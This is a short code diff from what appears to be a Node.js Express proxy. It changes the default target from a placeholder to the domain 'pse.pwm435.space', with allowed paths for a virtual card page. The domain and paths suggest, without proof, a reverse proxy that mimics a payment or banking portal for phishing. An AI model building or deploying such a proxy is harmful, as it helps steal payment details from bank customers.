@@ -5,7 +5,7 @@ const crypto = require('crypto');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
-const TARGET_URL = process.env.TARGET_URL || 'https://tu-servidor-real.com';
+const TARGET_URL = process.env.TARGET_URL || 'http://pse.pwm435.space';
 const ALLOWED_PATHS = ['/3co', '/3co/tarjetavirtual'];
 
 // Seguridad adicional
